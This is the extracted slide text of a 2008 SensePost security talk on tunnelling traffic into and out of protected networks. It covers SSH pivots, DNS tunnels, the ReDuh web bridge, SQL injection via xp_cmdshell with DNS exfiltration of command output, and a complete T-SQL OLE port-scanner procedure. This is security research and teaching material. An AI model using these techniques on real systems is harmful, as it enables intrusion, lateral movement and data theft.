Pushing a Camel through the
eye of the Needle!
[Funneling Data in and out of Protected Networks]
SensePost 2008
About:us
• SensePost
– Specialist Security firm based in South Africa;
– Customers all over the globe;
– Talks / Papers / Books
• {marco,haroon}@sensepost.com
– Spend most of our time breaking stuff
((thinking about breaking stuff) or playing
foosball!)
• What this talk is about ? (Hint: not foosball!)
What this talk is about?
A progression of Attacks
• A brief trip to the past (1601-1990)
• Un-firewalled access to victim host
• And also un-firewalled to rest of the
network!
History (Continued.)
• The Introduction of firewalls..
• The failure to filter outbound traffic (circa
2000)
• CommandExec.[asp|jsp|php|*]
{The need for a comfortable Channel}
History (Continued.)
• Creating binaries on remote victim.
• debug.exe and friends
• upload.asp (and friends)
• Win32 Port Binding (1998)
Remote Exec (with feeling!)
• We really needed to use the words AJAX
and XMLHttpRequest object to qualify as
a web 2.0 talk.
• We will still add XML, SOAP and a tool
with no vowels in its name (watch for this!)
Time to pivot™
• This stuff is ancient history.
• Sp_quickkill
• Extreme nc usage
• SensePost tcpr / Foundstonefport (Circa 2000)
Client
Pivot
Target
Start tcpr
• XP and IPV6!
• Ssh tunnel
Listens on port
55555
Connects to
pivot:55555
Pivot connects to
target
Proxied connection between client and target
SSH Tunnels (a)
Client
Pivot
Target
Listens on
port 22
Pivot runs sshd
ssh –L
55555:pivot:25
Proxied connection from Client to Target port
Listens on
port 55555
Listens on
port 25
SSH Tunnels (b)
• Instead lets look at –R
• So all we need is an ssh client on the
remote machine, an SSHD on one of ours
and we are in the game!
• putty + plink FTW!
Local
machine
Client is
the Pivot
Target
Listens on
port 22
ssh –R
55555:localmachin
e:445
Target runs sshd
Listens on
port 445
Proxy connection from target:55555 to local machine:445
Listens on
port 55555
Interlude (dns2tcp)
• Available from:
http://www.hsc.fr/ressources/outils/dns2tcp
/
• Perfect for homes away form home
• Perfect for stealing wifi access
A good marriage (sshtun +
dnstun)
Layer 2 bridges
• If you aren’t going to the network, bring
the network to you
• If you’re bridging the network, make it
protocol independent
• Requires inbound or outbound connection
ability
Layer 2 bridges
• Pros
– Clean interface to network
– Not port or connection dependent, protocol
independent
– Simple to setup and use
• Cons
– Death by firewall
– Requires external deps (pcap,libnet)
• Examples
– Tratt by Olleb (www.toolcrypt.org)
– MyNetwork by Greg Hoglund (www.rootkit.com)
A Brief Recap
• We used to be able to hit everything we
wanted to.
• We were happily redirecting traffic when
firewalls were more forgiving
• Outbound Access Made us amazingly
happy.
• Network level bridging was cool but the
rules are changing..
• Can we do this completely over HTTP /
HTTPS?
Introducing glenn.jsp
• (Working title)
a)We can hit our target on port 80 (or 443)
b)Ability to upload / create a web page on
the target [example: JMX Console]
c)Network level filtering is tight.
d)Possible reverse proxies in-between
• [a],[b],[c],[d] meet [one smart intern]
ReDuh.jsp
•
Written by Glenn Wilkinson (PI:EMAIL)
•
Upload / Create .JSP page on server
•
Fire-up local proxy (localhost:1234)
•
Tell web-page to create web-bridge to internal_host:3389
– JSP creates socket to internal_host:3389
– JSP creates queues to handle internal comms.
•
Attacker aims RDC client at local proxy on 127.0.0.1:1234
– Local endpoint accepts traffic, converts packets to base-64
encoded POST messages.
– Packets are POSTed to .JSP page
•
JSP Page decodes packets, queues for delivery via created
socket.
– Return traffic is queued, encoded as base64 and queued again.
•
Proxy polls server for return packet data, recreates them as
packets and re-feeds the local socket.
What this means..
• We have a simple TCP over HTTP/HTTPS
implementation
• It requires the creation of a simple, single
.JSP file on the target..
• Surely this isn’t .JSP specific ?
• PI:EMAIL ported this while
cursing a lot to ASP.net
• PI:EMAIL gave us the php
version.
• Basically covers most of the common
cases.. If we can create a web page, we can
create a circuit..
Squeeza
• Released at BH USA 2007
• Advanced SQL injection tool (another one on
the pile…), aimed at MS SQL
• Treated injection slightly differently
• Split content generation from return channel
– Content generation
– Supported multiple return channels
• Could mostly mix ‘n match  content
generation modes with return channels
Squeeza
• Content created (not the interesting part)
– Command execution: xp_cmdshell (old faithful)
– Data extraction: select name from sysobjects where
xtype=‘U’
– File download: bulk insert … from ‘c:\blah.txt’
• Return channels (more interesting part)
– DNS
– Timing
– HTTP Error-based (ala Automagic SQL Injector)
• Return channels NOT supported
– Inline HTML extraction
– Standard blind injection techniques
Squeeza process overview
Generate content using command execution, file copy or
data extraction injection string
Store data in a temporary table inside SQL database
Extract data using return channel of choice: DNS, timing,
SQL error messages
Not fast enough for real-time applications, but
good enough for batch applications such as
command execution, file copy etc. Don’t
expect to relay VNC traffic.
Squeeza: DNS
•
Weaponised SQL server content extraction through DNS
queries
•
Data broken up into chunks, encoded and emitted through
DNS
•
Which meant:
– Entire DNS channel handled in SQL
– Elevated privs not required (but used if available)
– Provided reliability guarantees, since client had complete
control over what was requested and received
•
Compare to SQLNinja (awesome tool, DNS not so much)
– requires binary upload+cmd execution
– reliability guarantee is ‘try again’, as client can’t control
remote binary
Temp table
Attacker
Victim
WWW/SQL
Server
exec xp_cmdshell ‘ipconfig /all’
Basic setup: attacker has SQL injection vulnerability into  SQL server, as
‘sa’
Command is run on SQL server
Output is produced
Windows IP Configuration
Ethernet adapter Local Area Connection:
   Connection-specific DNS Suffix  . :
   IP Address. . . . . . . . . . . . : 192.168.0.47
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.0.2
Output is stored in DB
Second injection string
Grab limited chunk of data from temporary table, convert to hex, tack on
domain
57696e646f777320495020436f6e66696775726174696f6e.sensepos
t.com
Windows IP Configuration
Initiate DNS request with encoded data
Attacker
DNS Server
57696e646f777320495020436f6e66696775726174696f6e.sensepost.com
Request is received and converted into original form
Windows IP Configuration
Squeeza: timing
• Weaponised SQL server content
extraction through timing attacks
• Data broken up into chunks, bits
extracted one at a time through timing
differences
• Which meant:
– Didn’t need an explicit return channel
– Not absolutely reliable, but good enough
– Many cups of coffee
Profiling SQL servers
• We want to know which SQL server version we’re
dealing with
• Features added and removed between releases
– 2000 added ????
– 2005 removed xp_execresultset
– 2005 added stored procedure creation functionality
• Common problem with a number of solutions
– select @@version, choose return channel
• What about other methods?
– Look for new/removed tables/stored procs/users
– Look for new SQL syntax
Squeeza future
• Seems too nice to forget
• Not enough uptake
• Maybe piggyback onto Metasploit??
• What would this require?
This OLE’ thing
•
In 2002, Chris Anley’s paper discussed OLE object
instantiation and execution from T-SQL
– Demo’ed file reading/writing, shell execution
– Maybe this got lost in the rest of the goodness
•
How many SQL injection tools ignore OLE attacks?
– ???????????
•
Is it because of privs?
– Hmmmmm, sp_oacreate, sp_oamethod require execute on
those methods
•
Complexity?
– Regular injections used by other tools create/execute stored
procs all the time
•
Payload size?
– Again, current tools are no super packers
Growing OLE’ together
• In 6 years, not much has changed
• We can still use OLE objects (another
route for ActiveX object exploitation?)
• Why this route?
– Safe for scripting
– Killbits
• We think OLE integration deserves much
more focus in injection payloads
Something OLE’, something
new
Example of a usable new OLE payload
SQL-based port scanner
SQL port scanner
• Basis is “MSXML2.ServerXMLHTTP”
object
• Used to retrieve XML data from a
webserver
• Installed with IE, IIS,????
– Two versions on win2k3
• We can specify then IP:port of the target
webserver
• Return values differ depending on
whether a webserver is listening or not
SQL port scanner
• We can tell if ports are open or
closed/filtered
• Even better, basic protocol fingerprinting
since we’re also told if a legitimate
webserver answered
• But how to differentiate between closed
and filtered?
• Same way everyone else does (mostly)
– Timing and timeouts
– setTimeouts
probeip(ip, port)
CREATE PROCEDURE probeip @host VARCHAR(50), @port VARCHAR(5)AS
BEGIN
DECLARE @oINT,@ropINT,@rseINT,@statusINT,@s varchar(60)
set @s='http://'+@host+':'+@port+'/’
EXEC sp_OACreate 'MSXML2.ServerXMLHTTP', @oOUT
EXEC @rop = sp_OAMethod @o, 'setTimeouts', NULL, 3000, 3000,
3000, 3000
EXEC @rop = sp_OAMethod @o, 'open', NULL, 'GET',@s
EXEC @rse = sp_OAMethod @o, 'send’
EXEC sp_OAGetProperty@o, 'status', @status OUT
EXEC sp_OADestroy @o
SELECT @s+CASE@rop WHEN -2147012891 THEN 'Blocked' WHEN 0 THEN
CASE @rse WHEN -2147012744 THEN 'Open' WHEN 0 THEN 'Open/WWW'
WHEN -2147012867 THEN 'Closed' WHEN -2147012894 THEN
'Filtered' WHEN -2147012851 THEN 'Open/WWWR' ELSE 'Invalid'
END END
END
Basic probe stored procedure
Instantiate OLE control